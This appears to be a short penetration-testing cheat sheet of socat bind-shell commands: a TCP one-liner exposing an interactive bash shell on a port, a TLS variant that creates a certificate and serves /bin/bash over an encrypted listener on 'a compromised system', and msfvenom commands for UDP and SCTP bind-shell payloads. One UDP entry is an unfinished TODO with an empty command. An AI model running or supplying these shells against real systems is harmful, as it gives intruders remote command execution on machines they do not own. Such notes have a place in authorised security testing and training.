# Socat

## 01 - One-liners

### 1.1 - TCP Method

```
$ socat tcp-listen:<PORT>,reuseaddr,fork exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane
```

### 1.2 - UDP Method

TODO: Generate an msfvenom for UDP bind shell socat

```
$ socat
```
\
### 1.3 - TLS Method

Note: Only generated TLS certificates in a compromised system.

```
$ openssl req -newkey rsa:2048 -nodes -keyout private.key -x509 -days 362 -out certificate.crt

$ cat private.key certificate.crt > key.pem

$ socat OPENSSL-LISTEN:<PORT>,cert=key.pem,verify=0,fork EXEC:/bin/bash
```

## 02 - Generate via `msfvenom`

### 2.1 - UDP Method

```
$ msfvenom -p cmd/unix/bind_socat_udp lport=<PORT>
```

### 2.2 - SCTP Method

```
$ msfvenom -p cmd/unix/bind_socat_sctp lport=<PORT>
```

---
## References

- [GTFOBins: Socat](https://gtfobins.github.io/gtfobins/socat/)